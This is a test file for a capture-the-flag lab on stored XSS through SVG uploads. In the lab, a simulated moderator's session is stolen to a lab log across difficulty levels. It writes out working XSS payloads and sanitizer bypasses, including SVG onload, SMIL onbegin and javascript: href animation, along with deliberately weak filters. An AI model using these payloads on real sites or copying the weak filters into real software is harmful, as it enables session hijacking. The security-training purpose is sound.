// src/districts/scriptorium/sc-05-svg-xss/sc-05.spec.ts — SC-05 SVG upload XSS.
// The exploit as a player does it: read the marker -> upload a sigil -> ask the moderator to review it -> the
// moderator's simulated browser renders the review (GET /review, the level's whole answer) -> the static oracle says
// the payload ran -> the moderator's session lands in the attacker log -> sign in with it -> flag. The player's own
// browser sees the payload only inside the sandboxed preview; the real /sigil route is always an inert download.
import { parseFragment } from 'parse5';
import { describe, it, expect } from 'vitest';
import type request from 'supertest';
import {
  FLAG_RE, attackerHits, describeExploitMatrix, describeLabView, freshSession, panelOf, unescapeHtml, type Agent,
} from '../../../../tests/helpers.js';
import { multipart, type Part } from '../../../../tests/support/uploads.js';
import type { Level } from '../../../core/levels.js';
import { XSS_LIMITS, XSS_STEAL_URL, xssOracle } from '../../../core/xss.js';
import { describeVictimAction } from '../../_shared/victim-lab.testkit.js';
import { SC05 } from './challenge.js'; // registers SC-05 before createApp() inside freshSession
import { SIGIL, impl, labFor } from './model.js';

const LAB = '/d/scriptorium/svg-xss';
const NS = 'xmlns="http://www.w3.org/2000/svg"';
const XLINK = 'xmlns:xlink="http://www.w3.org/1999/xlink"';
const XHTML = 'http://www.w3.org/1999/xhtml';
const LEVELS = ['acolyte', 'templar', 'inquisitor', 'divine'] as const;

interface Ctx { agent: Agent; level: Level; sid: string }
type Script = (c: Ctx) => Promise<request.Response>;

// --- Player helpers --------------------------------------------------------------------------------------------

const page = (agent: Agent, level: Level, lang = 'en') => agent.get(`${LAB}?level=${level}&lang=${lang}`);
const sigil = (value: string | Buffer, filename = 'sigil.svg', contentType = 'image/svg+xml'): Part => ({ name: 'sigil', filename, value, contentType });
const upload = (agent: Agent, level: Level, parts: readonly Part[]) => {
  const m = multipart(parts);
  return agent.post(`${LAB}?level=${level}`).set('Content-Type', m.contentType).send(m.body);
};
const review = (agent: Agent, level: Level) => agent.post(`${LAB}/victim/review?level=${level}`);
const signIn = (agent: Agent, level: Level, session: string) => agent.post(`${LAB}?level=${level}`).type('form').send({ intent: 'sign-in', session });
const markerOn = (html: string): string => unescapeHtml(/<code data-marker>([^<]*)<\/code>/.exec(html)?.[1] ?? '');
const stolenKey = (html: string): string => {
  const hit = attackerHits(html).find((h) => h.url.startsWith(`${XSS_STEAL_URL}?`));
  return hit === undefined ? 'none' : new URL(hit.url).searchParams.get('c') ?? 'none';
};
/** The preview frame on a lab page: its srcdoc document, as the browser decodes the attribute ('' when there is none). */
const previewSrcdoc = (html: string): string => {
  const frame = /<iframe class="xss-preview"[^>]*><\/iframe>/.exec(html)?.[0] ?? '';
  const el = parseFragment(frame).childNodes.find((n) => 'tagName' in n);
  return el !== undefined && 'attrs' in el ? el.attrs.find((a) => a.name === 'srcdoc')?.value ?? '' : '';
};

/** The exploit, as a player does it: read the marker, upload the sigil, ask for a review, read the log, sign in. */
const exploit = (svg: (marker: string) => string): Script => async ({ agent, level }) => {
  const marker = markerOn((await page(agent, level)).text);
  await upload(agent, level, [sigil(svg(marker))]);
  await review(agent, level);
  return signIn(agent, level, stolenKey((await page(agent, level)).text));
};

// --- The exploits ------------------------------------------------------------------------------------------------
// Acolyte: the review pastes the sigil into its HTML as it is: an SVG script element runs.
const ACOLYTE = (m: string) => `<svg ${NS}><script>${m}</script></svg>`;
// Templar: script elements are cut out, but the SVG's own load handler stays, and the page still inlines it.
const TEMPLAR = (m: string) => `<svg ${NS} onload="${m}"><circle r="4"/></svg>`;
// Inquisitor: the sigil is opened as image/svg+xml (a live XML document); the handler denylist is HTML's, so an SVG
// animation's own event (SMIL onbegin) is not on it.
const INQUISITOR = (m: string) => `<svg ${NS}><rect width="8" height="8"><set attributeName="width" to="9" onbegin="${m}"/></rect></svg>`;
const PLAIN = `<svg ${NS} width="16" height="16"><circle cx="8" cy="8" r="6" fill="gold"/></svg>`;

describeExploitMatrix<Script>({
  challenge: SC05,
  path: LAB,
  send: (agent, level, script, _url, { sid }) => script({ agent, level, sid }),
  exploits: { acolyte: exploit(ACOLYTE), templar: exploit(TEMPLAR), inquisitor: exploit(INQUISITOR) },
  resisted: 'Wrong session key.',
  legit: [
    { name: 'a plain sigil is stored', input: ({ agent, level }) => upload(agent, level, [sigil(PLAIN)]), expect: /Sigil stored \(\d+ bytes\)\./ },
    {
      name: 'the moderator reviews a plain sigil: your server receives nothing',
      input: async ({ agent, level }) => { await upload(agent, level, [sigil(PLAIN)]); await review(agent, level); return page(agent, level); },
      expect: /ended on a citadel\.test page \(HTTP 200\)[\s\S]*No requests yet\./,
    },
    { name: 'a wrong key', input: ({ agent, level }) => signIn(agent, level, 'nope'), expect: 'Wrong session key.' },
  ],
  malformed: [{
    name: 'a plain form post is not an upload',
    input: ({ agent, level }) => agent.post(`${LAB}?level=${level}`).type('form').send({ caption: 'x' }),
    levels: ['acolyte', 'templar', 'inquisitor'],
  }],
  privileged: {
    name: 'the moderator\'s real session key',
    input: ({ agent, level, sid }) => signIn(agent, level, labFor({ sessionId: sid, level }).key),
    expect: 'Signed in as the moderator.',
  },
  errorRe: /Upload error|Storage error/,
});

describeLabView({
  challenge: SC05,
  path: LAB,
  account: /You are signed in as <code>pilgrim<\/code>/,
  echoField: 'session',
  extra: { intent: 'sign-in' },
  oddBodies: [{ session: { a: 1 } }, { intent: 'sign-in', session: ['x'] }, { intent: ['sign-in'] }, { caption: { a: 1 } }, [], {}],
  ok: (agent, level, sid) => signIn(agent, level, labFor({ sessionId: sid, level }).key),
  bad: (agent, level) => signIn(agent, level, 'nope'),
});

describeVictimAction({
  challenge: SC05,
  path: LAB,
  description: {
    en: 'opens the review of your sigil (/review) in the gallery, signed in as the moderator',
    id: 'membuka tinjauan sigilmu (/review) di galeri, sebagai moderator yang sedang masuk',
  },
  label: { en: 'Ask the moderator to review your sigil', id: 'Minta moderator meninjau sigilmu' },
});

// --- Lab-specific cases ------------------------------------------------------------------------------------------

const fresh = async (level: Level): Promise<Ctx> => ({ ...(await freshSession()), level });
const lab = (c: Ctx) => labFor({ sessionId: c.sid, level: c.level });
const stored = (c: Ctx) => lab(c).fs.read(SIGIL)?.bytes.toString('utf8');
const lastVerdict = (c: Ctx) => lab(c).moderator.verdicts.at(-1);

describe('SC-05 the full recipe over HTTP', () => {
  it('marker -> upload -> review -> the oracle -> the stolen session in your log -> sign in -> flag credited at that level', async () => {
    for (const [level, payload] of [['acolyte', ACOLYTE], ['templar', TEMPLAR], ['inquisitor', INQUISITOR]] as const) {
      const c = await fresh(level);
      const marker = markerOn((await page(c.agent, level)).text);
      expect(marker, level).toBe(lab(c).marker.call);
      await upload(c.agent, level, [sigil(payload(marker))]);
      expect((await review(c.agent, level)).status, level).toBe(303);
      const v = lastVerdict(c);
      expect([v?.url, v?.fired, v?.page.executes], level).toEqual(['http://citadel.test/review', true, true]);
      expect(v?.page.sinks.some((s) => s.marker && !s.isolated), level).toBe(true);
      const panel = panelOf((await page(c.agent, level)).text);
      expect(panel, level).toContain(`<code>GET ${XSS_STEAL_URL}?c=${lab(c).key}</code>`);
      const signed = await signIn(c.agent, level, lab(c).key);
      const flag = signed.text.match(FLAG_RE)?.[0];
      expect(flag, level).toBeDefined();
      expect((await c.agent.post('/api/submit').send({ challengeId: SC05.id, submission: flag })).body, level).toMatchObject({ solved: true, level });
    }
  });

  it('the moderator\'s browser gets the level\'s whole answer: A and T an HTML page with the sigil inline, I the file as image/svg+xml, D an HTML page with the source as text', async () => {
    const expected: Record<Level, readonly [string, string]> = {
      acolyte: ['text/html; charset=utf-8', 'inline'], templar: ['text/html; charset=utf-8', 'inline'],
      inquisitor: ['image/svg+xml', 'inline'], divine: ['text/html; charset=utf-8', 'inline'],
    };
    for (const level of LEVELS) {
      const c = await fresh(level);
      await upload(c.agent, level, [sigil(PLAIN)]);
      const r = impl.for(level).review(stored(c) as string);
      expect([r.headers['Content-Type'], r.headers['Content-Disposition']], level).toEqual(expected[level]);
      expect(r.headers['Content-Security-Policy'], level).toBeUndefined(); // no level leans on a CSP: the oracle would hide a flaw
      await review(c.agent, level);
      const v = lastVerdict(c);
      expect(v?.fired, level).toBe(false);
      expect(v?.page.wellFormed, level).toBe(level === 'inquisitor' ? true : undefined); // read as XML only at Inquisitor
      // the page is shown as text on the lab page
      const text = (await page(c.agent, level)).text;
      expect(text, level).toContain(`<li><code>Content-Type: ${expected[level][0]}</code></li>`);
      expect(text, level).toContain(`<li><code>Content-Disposition: ${expected[level][1]}</code></li>`);
    }
  });

  it('Divine: the moderator sees your marker as text, for every lower exploit, and your server receives nothing', async () => {
    const c = await fresh('divine');
    const marker = markerOn((await page(c.agent, 'divine')).text);
    for (const payload of [ACOLYTE, TEMPLAR, INQUISITOR]) {
      await upload(c.agent, 'divine', [sigil(payload(marker))]);
      await review(c.agent, 'divine');
      const v = lastVerdict(c);
      expect([v?.fired, v?.page.executes, v?.page.reachedMarker, v?.page.limited]).toEqual([false, false, true, undefined]);
    }
    expect(attackerHits((await page(c.agent, 'divine')).text)).toEqual([]);
  });

  it('Divine never yields limited: \'dtd\': every DOCTYPE is refused before anything is stored, and so is it at Inquisitor', async () => {
    const dtd = [
      `<!DOCTYPE svg [<!ENTITY x "hvwa('0123456789abcdef')">]><svg ${NS}><script>&x;</script></svg>`,
      `<!DOCTYPE svg [<!ATTLIST svg onload CDATA "hvwa('0123456789abcdef')">]><svg ${NS}/>`,
      `<?xml version="1.0"?>\n<!doctype svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg ${NS}/>`,
      `<!DOCTYPE svg SYSTEM "a>b" [<!ENTITY x "y">]><svg ${NS}/>`,
    ];
    for (const level of ['inquisitor', 'divine'] as const) {
      const c = await fresh(level);
      await upload(c.agent, level, [sigil(PLAIN)]);
      for (const svg of dtd) {
        const r = await upload(c.agent, level, [sigil(svg)]);
        expect(r.text, `${level} ${svg}`).toContain('A DOCTYPE is not accepted in a sigil.');
        expect(r.text, level).toContain('lab-error');
        expect(stored(c), level).toBe(PLAIN); // the previous sigil stays
        await review(c.agent, level);
        expect(lastVerdict(c)?.page.limited, level).toBeUndefined();
      }
    }
  });

  it('the oracle reads every review page whole: a 12 KiB sigil keeps it under the oracle\'s 16 KiB at every level, and one byte more is refused', async () => {
    const pad = (n: number, fill: string) => `<svg ${NS}><desc>${fill.repeat(n - `<svg ${NS}><desc></desc></svg>`.length)}</desc></svg>`;
    for (const level of LEVELS) {
      for (const fill of ['a', '"']) {
        const c = await fresh(level);
        const big = pad(12 * 1024, fill);
        expect(Buffer.byteLength(big)).toBe(12 * 1024);
        expect((await upload(c.agent, level, [sigil(big)])).text, level).toContain('Sigil stored');
        await review(c.agent, level);
        const v = lastVerdict(c);
        expect(v?.page.limited, `${level} ${fill}`).toBeUndefined();
        expect(impl.for(level).review(stored(c) as string).body.length, level).toBeLessThan(XSS_LIMITS.htmlLength);
      }
      const c = await fresh(level);
      const over = await upload(c.agent, level, [sigil(pad(12 * 1024 + 1, 'a'))]);
      expect(over.text, level).toContain(level === 'divine' ? 'Invalid request.' : 'Upload error: ');
      expect(stored(c), level).toBeUndefined();
    }
  });
});

describe('SC-05 the player\'s browser: the sandboxed preview, and the real /sigil as an inert download', () => {
  it('the preview shows the moderator\'s review in a sandboxed frame: the same body, isolated, never raw on your page', async () => {
    for (const [level, payload] of [['acolyte', ACOLYTE], ['templar', TEMPLAR], ['inquisitor', INQUISITOR], ['divine', ACOLYTE]] as const) {
      const c = await fresh(level);
      const { call } = lab(c).marker;
      await upload(c.agent, level, [sigil(payload(call))]);
      const res = await page(c.agent, level);
      const body = impl.for(level).review(stored(c) as string).body;
      expect(previewSrcdoc(res.text).endsWith(`<body>${body}</body></html>`), level).toBe(true);
      const v = xssOracle(res.text, call);
      expect(v.executes, level).toBe(false);
      expect(v.sinks.filter((s) => s.marker).every((s) => s.isolated), level).toBe(true);
      if (level !== 'divine') expect(v.sinks.filter((s) => s.marker).length, level).toBeGreaterThan(0);
      expect(res.text, level).toContain('sandbox="allow-scripts"');
      expect(res.text, level).not.toContain('allow-same-origin');
      expect(res.text, level).not.toContain(payload(call)); // the sigil is never raw on the platform page
    }
  });

  it('the preview says how the moderator\'s browser reads the review (XML at Inquisitor)', async () => {
    const c = await fresh('inquisitor');
    await upload(c.agent, 'inquisitor', [sigil(PLAIN)]);
    expect((await page(c.agent, 'inquisitor')).text).toContain('reads it as an XML document');
    const a = await fresh('acolyte');
    await upload(a.agent, 'acolyte', [sigil(PLAIN)]);
    expect((await page(a.agent, 'acolyte')).text).toContain('reads it as an HTML page');
  });

  it('the real /sigil is an inert download at every level: octet-stream, nosniff, attachment, CSP sandbox; never image/svg+xml', async () => {
    const { agent, sid } = await freshSession();
    for (const level of LEVELS) {
      const none = await agent.get(`${LAB}/sigil?level=${level}`);
      expect(none.status, level).toBe(404);
      const svg = TEMPLAR(labFor({ sessionId: sid, level }).marker.call);
      await upload(agent, level, [sigil(svg)]);
      const r = await agent.get(`${LAB}/sigil?level=${level}`);
      expect(r.status, level).toBe(200);
      expect(r.headers['content-type'], level).toBe('application/octet-stream');
      expect([r.headers['x-content-type-options'], r.headers['content-disposition'], r.headers['content-security-policy']], level)
        .toEqual(['nosniff', 'attachment', 'sandbox']);
      expect((r.body as Buffer).toString('utf8'), level).toBe(labFor({ sessionId: sid, level }).fs.read(SIGIL)?.bytes.toString('utf8'));
      expect(FLAG_RE.test((r.body as Buffer).toString('latin1')), level).toBe(false);
    }
  });

  it('the simulated server\'s /sigil is the same inert download (Divine\'s review links to it)', async () => {
    const c = await fresh('divine');
    await upload(c.agent, 'divine', [sigil(PLAIN)]);
    const visit = lab(c).moderator.follow('http://citadel.test/sigil');
    expect([visit.outcome, visit.page?.status]).toEqual(['page', 200]);
    expect(lab(c).moderator.verdicts).toEqual([]); // a download is never rendered, so never judged
  });
});

describe('SC-05 each level\'s filter', () => {
  it('Acolyte keeps the sigil exactly as uploaded', async () => {
    const c = await fresh('acolyte');
    const svg = `<svg ${NS} onload="x()"><script>y()</script></svg>`;
    await upload(c.agent, 'acolyte', [sigil(svg)]);
    expect(stored(c)).toBe(svg);
  });

  it('Templar cuts every script element (any case, nested, unclosed) and keeps the rest of the SVG', () => {
    const t = impl.for('templar');
    const cut = (svg: string) => { const a = t.accept(svg); return a.ok ? a.svg : `refused: ${a.text}`; };
    expect(cut(`<svg ${NS}><script>a()</script><circle/></svg>`)).toBe(`<svg ${NS}><circle/></svg>`);
    expect(cut('<svg><SCRIPT type="text/javascript">a()</SCRIPT ></svg>')).toBe('<svg></svg>');
    expect(cut('<svg><scr<script></script>ipt>a()</script></svg>')).toBe('<svg></svg>');
    expect(cut('<svg><script>a()')).toBe('<svg>');
    expect(cut(`<svg ${NS} onload="a()"><foreignObject/></svg>`)).toBe(`<svg ${NS} onload="a()"><foreignObject/></svg>`);
  });

  it('Inquisitor removes HTML\'s event handlers (any case) and javascript: links, refuses a DOCTYPE, keeps SVG\'s animation events', () => {
    const i = impl.for('inquisitor');
    const clean = (svg: string) => { const a = i.accept(svg); return a.ok ? a.svg : `refused: ${a.text}`; };
    expect(clean(`<svg ${NS} onload="a()" ONCLICK='b()'\tonmouseover="c()"><circle onerror="d()" r="1"/></svg>`)).toBe(`<svg ${NS}><circle r="1"/></svg>`);
    expect(clean(`<svg ${NS}><svg:script xmlns:svg="http://www.w3.org/2000/svg">a()</svg:script></svg>`)).toBe(`<svg ${NS}></svg>`);
    expect(clean(`<svg ${NS}><a href=" JavaScript:a()"><text>x</text></a></svg>`)).toBe(`<svg ${NS}><a><text>x</text></a></svg>`);
    expect(clean(`<svg ${NS}><set attributeName="x" onbegin="a()" onend="b()"/></svg>`)).toBe(`<svg ${NS}><set attributeName="x" onbegin="a()" onend="b()"/></svg>`);
    expect(clean(`<!DOCTYPE svg><svg ${NS}/>`)).toBe('refused: A DOCTYPE is not accepted in a sigil.');
  });

  it('Inquisitor strips only inside start tags: a quote in text, a comment or CDATA hides no handler; text is left alone', () => {
    const i = impl.for('inquisitor');
    const clean = (svg: string) => { const a = i.accept(svg); return a.ok ? a.svg : `refused: ${a.text}`; };
    expect(clean(`<svg ${NS}><desc> a='</desc><svg onload="a()"/><desc>'</desc></svg>`)).toBe(`<svg ${NS}><desc> a='</desc><svg/><desc>'</desc></svg>`);
    expect(clean(`<svg ${NS}><desc><![CDATA[<x a=']]></desc><svg onload="a()"/><desc><![CDATA[']]></desc></svg>`))
      .toBe(`<svg ${NS}><desc><![CDATA[<x a=']]></desc><svg/><desc><![CDATA[']]></desc></svg>`);
    expect(clean(`<svg ${NS}><!-- a=' --><svg onload="a()"/><!-- ' --></svg>`)).toBe(`<svg ${NS}><!-- a=' --><svg/><!-- ' --></svg>`);
    expect(clean(`<svg ${NS}><?pi a=' ?><svg onload="a()"/><?pi ' ?></svg>`)).toBe(`<svg ${NS}><?pi a=' ?><svg/><?pi ' ?></svg>`);
    // any XML name starts a tag, not only ASCII letters; a script with any prefix is cut
    expect(clean(`<é xmlns="${XHTML}" onclick="a()">x</é>`)).toBe(`<é xmlns="${XHTML}">x</é>`);
    expect(clean(`<svg ${NS}><é:script xmlns:é="${XHTML}">a()</é:script></svg>`)).toBe(`<svg ${NS}></svg>`);
    // text that only looks like an attribute is text: nothing to strip
    expect(clean(`<svg ${NS}><desc> onload="a()" </desc></svg>`)).toBe(`<svg ${NS}><desc> onload="a()" </desc></svg>`);
  });

  it('Inquisitor drops srcdoc, and javascript: in src, action and formaction as in href and xlink:href (entities and tabs undone first)', () => {
    const i = impl.for('inquisitor');
    const clean = (svg: string) => { const a = i.accept(svg); return a.ok ? a.svg : `refused: ${a.text}`; };
    expect(clean(`<iframe xmlns="${XHTML}" srcdoc="&lt;b&gt;x&lt;/b&gt;"/>`)).toBe(`<iframe xmlns="${XHTML}"/>`);
    expect(clean(`<iframe xmlns="${XHTML}" src="javascript:a()"/>`)).toBe(`<iframe xmlns="${XHTML}"/>`);
    expect(clean(`<form xmlns="${XHTML}" action="javascript:a()"><button formaction=' javascript:b()'>x</button></form>`))
      .toBe(`<form xmlns="${XHTML}"><button>x</button></form>`);
    expect(clean(`<svg ${NS} ${XLINK}><a xlink:href="javascript:a()"><text>x</text></a></svg>`)).toBe(`<svg ${NS} ${XLINK}><a><text>x</text></a></svg>`);
    expect(clean(`<a href="&#106;avascript:a()">x</a><a href="java&#x9;script:b()">y</a><a href="JAVA&#10;SCRIPT:c()">z</a>`)).toBe('<a>x</a><a>y</a><a>z</a>');
    // ordinary links and sources are kept
    expect(clean(`<image href="sigil.png"/><iframe xmlns="${XHTML}" src="https://example.test/"/><a href="#top">t</a>`))
      .toBe(`<image href="sigil.png"/><iframe xmlns="${XHTML}" src="https://example.test/"/><a href="#top">t</a>`);
  });

  it('Inquisitor end to end: only SVG\'s own animation (SMIL events, a SMIL href animation) gets through; Templar\'s payloads and the rest do not', async () => {
    const c = await fresh('inquisitor');
    const m = lab(c).marker.call;
    const refused: Record<string, string> = {
      'a quote in text hides a handler': `<svg ${NS}><desc> a='</desc><svg onload="${m}"/><desc>'</desc></svg>`,
      'CDATA hides a handler': `<svg ${NS}><desc><![CDATA[<x a=']]></desc><svg onload="${m}"/><desc><![CDATA[']]></desc></svg>`,
      'a comment hides a handler': `<svg ${NS}><!-- a=' --><svg onload="${m}"/><!-- ' --></svg>`,
      'a script with a non-ASCII prefix': `<svg ${NS}><foreignObject><é:script xmlns:é="${XHTML}">${m}</é:script></foreignObject></svg>`,
      'an XHTML iframe srcdoc': `<svg ${NS}><foreignObject width="9" height="9"><iframe xmlns="${XHTML}" srcdoc="&lt;script&gt;${m}&lt;/script&gt;"/></foreignObject></svg>`,
      'an XHTML iframe javascript: src': `<svg ${NS}><foreignObject width="9" height="9"><iframe xmlns="${XHTML}" src="javascript:${m}"/></foreignObject></svg>`,
      'an XHTML form javascript: action': `<svg ${NS}><foreignObject width="50" height="50"><form xmlns="${XHTML}" action="javascript:${m}"><button>go</button></form></foreignObject></svg>`,
      'an XHTML javascript: formaction': `<svg ${NS}><foreignObject width="50" height="50"><form xmlns="${XHTML}"><button formaction="javascript:${m}">go</button></form></foreignObject></svg>`,
      'an entity-encoded javascript: href': `<svg ${NS}><a href="&#106;avascript:${m}"><text y="20">x</text></a></svg>`,
      'Templar: an svg load handler': TEMPLAR(m),
      'Templar: a javascript: xlink:href': `<svg ${NS} ${XLINK}><a xlink:href="javascript:${m}"><text y="20">x</text></a></svg>`,
      'Templar: foreignObject with an XHTML img': `<svg ${NS}><foreignObject><img xmlns="${XHTML}" src="x" onerror="${m}"/></foreignObject></svg>`,
    };
    for (const [name, svg] of Object.entries(refused)) {
      await upload(c.agent, 'inquisitor', [sigil(svg)]);
      await review(c.agent, 'inquisitor');
      expect(lastVerdict(c)?.fired, name).toBe(false);
    }
    expect(attackerHits((await page(c.agent, 'inquisitor')).text)).toEqual([]);
    const kept: Record<string, string> = {
      'SMIL onbegin': INQUISITOR(m),
      'SMIL onend': `<svg ${NS}><animate attributeName="x" dur="0.1s" onend="${m}"/></svg>`,
      'a SMIL href animation': `<svg ${NS}><a><animate attributeName="href" values="javascript:${m}"/><text y="20">x</text></a></svg>`,
    };
    for (const [name, svg] of Object.entries(kept)) {
      await upload(c.agent, 'inquisitor', [sigil(svg)]);
      await review(c.agent, 'inquisitor');
      expect(lastVerdict(c)?.fired, name).toBe(true);
    }
  });

  it('one sigil per player: a second upload replaces the first, and the moderator reviews only the newest', async () => {
    const c = await fresh('acolyte');
    await upload(c.agent, 'acolyte', [sigil(ACOLYTE(lab(c).marker.call))]);
    await upload(c.agent, 'acolyte', [sigil(PLAIN)]);
    expect(stored(c)).toBe(PLAIN);
    expect(lab(c).fs.list().map((f) => f.path)).toEqual([SIGIL]);
    const text = (await page(c.agent, 'acolyte')).text;
    expect(text.match(/data-testid="sigil-source"/g)?.length).toBe(1);
    expect(unescapeHtml(/<pre data-testid="sigil-source">([^<]*)<\/pre>/.exec(text)?.[1] ?? '')).toBe(PLAIN);
    await review(c.agent, 'acolyte');
    expect(lastVerdict(c)?.fired).toBe(false);
    expect(attackerHits((await page(c.agent, 'acolyte')).text)).toEqual([]);
  });

  it('Divine stores the sigil as it is (it is never rendered) and refuses only a DOCTYPE', async () => {
    const c = await fresh('divine');
    const svg = ACOLYTE(lab(c).marker.call);
    await upload(c.agent, 'divine', [sigil(svg)]);
    expect(stored(c)).toBe(svg);
  });

  it('the upload page says when the filter changed the sigil', async () => {
    const c = await fresh('templar');
    const r = await upload(c.agent, 'templar', [sigil(`<svg ${NS}><script>a()</script></svg>`)]);
    expect(r.text).toMatch(/Sigil stored \(\d+ bytes\); the filter changed it \(\d+ characters before, \d+ after\)\./);
  });
});

describe('SC-05 the moderator and the lab state', () => {
  it('isolates players and levels: your marker runs nowhere else, and your sigil reaches only your moderator', async () => {
    const a = await freshSession();
    const b = await freshSession(a.app);
    const markerA = labFor({ sessionId: a.sid, level: 'acolyte' }).marker.call;
    await upload(b.agent, 'acolyte', [sigil(ACOLYTE(markerA))]); // B uploads A's payload to B's lab
    await review(b.agent, 'acolyte');
    expect(attackerHits((await page(b.agent, 'acolyte')).text)).toEqual([]);
    await upload(a.agent, 'templar', [sigil(TEMPLAR(markerA))]); // A's acolyte marker at A's templar level
    await review(a.agent, 'templar');
    expect(attackerHits((await page(a.agent, 'templar')).text)).toEqual([]);
    await upload(a.agent, 'acolyte', [sigil(ACOLYTE(markerA))]);
    await review(a.agent, 'acolyte');
    expect(stolenKey((await page(a.agent, 'acolyte')).text)).toBe(labFor({ sessionId: a.sid, level: 'acolyte' }).key);
    expect(attackerHits((await page(b.agent, 'acolyte')).text)).toEqual([]);
    expect(labFor({ sessionId: b.sid, level: 'templar' }).fs.read(SIGIL)).toBeUndefined();
  });

  it('every review re-arms the moderator: signed out in between, the payload still steals the session', async () => {
    const c = await fresh('acolyte');
    lab(c).moderator.cookies.clear();
    const res = await exploit(ACOLYTE)(c);
    expect(res.text).toMatch(FLAG_RE);
  });

  it('with no sigil the moderator has nothing to review: a note, no visit, nothing logged', async () => {
    const c = await fresh('acolyte');
    await review(c.agent, 'acolyte');
    const text = (await page(c.agent, 'acolyte')).text;
    expect(panelOf(text)).toContain('There is no sigil to review yet.');
    expect(attackerHits(text)).toEqual([]);
    expect(lab(c).moderator.verdicts).toEqual([]);
  });

  it('a payload that did not run gets a note that says why (XML read at Inquisitor; the marker as text below)', async () => {
    const c = await fresh('inquisitor');
    const { call } = lab(c).marker;
    await upload(c.agent, 'inquisitor', [sigil(`<svg><set attributeName="x" to="1" onbegin="${call}"/>`)]); // no namespace, not closed
    await review(c.agent, 'inquisitor');
    expect(panelOf((await page(c.agent, 'inquisitor')).text)).toContain('read your sigil as an XML document and found it not well-formed');
    const d = await fresh('divine');
    await upload(d.agent, 'divine', [sigil(ACOLYTE(lab(d).marker.call))]);
    await review(d.agent, 'divine');
    expect(panelOf((await page(d.agent, 'divine')).text)).toContain('Your marker reached the moderator&#39;s page, but nothing there ran it.');
  });

  it('a sigil with invalid UTF-8 is stored as text with replacement characters, never a 500', async () => {
    const c = await fresh('acolyte');
    const r = await upload(c.agent, 'acolyte', [sigil(Buffer.from([0x3c, 0x73, 0x76, 0x67, 0xff, 0xfe, 0x3e]))]);
    expect(r.status).toBe(200);
    expect(stored(c)).toBe('<svg��>');
  });

  it('keeps the caption and the session field escaped, and names the sigil field in the curl line', async () => {
    const c = await fresh('templar');
    const r = await upload(c.agent, 'templar', [sigil(PLAIN), { name: 'caption', value: '"><b>x</b>' }]);
    expect(r.text).toContain('value="&#34;&gt;&lt;b&gt;x&lt;/b&gt;"');
    expect(r.text).not.toContain('<b>x</b>');
    expect(r.text).toMatch(/-F 'sigil=@\.\/local-file;filename=&lt;name&gt;;type=&lt;content type&gt;' -F 'caption=&lt;text&gt;'/);
  });

  it('Restart lab: drops the sigil and the attacker log at the served level only', async () => {
    const c = await fresh('acolyte');
    const marker = lab(c).marker.call;
    await upload(c.agent, 'acolyte', [sigil(ACOLYTE(marker))]);
    await review(c.agent, 'acolyte');
    await upload(c.agent, 'divine', [sigil(PLAIN)]);
    expect((await c.agent.post(`${LAB}/_reset?level=acolyte`)).status).toBe(303);
    expect(lab(c).fs.read(SIGIL)).toBeUndefined();
    expect(attackerHits((await page(c.agent, 'acolyte')).text)).toEqual([]);
    expect(labFor({ sessionId: c.sid, level: 'divine' }).fs.read(SIGIL)).toBeDefined();
  });
});
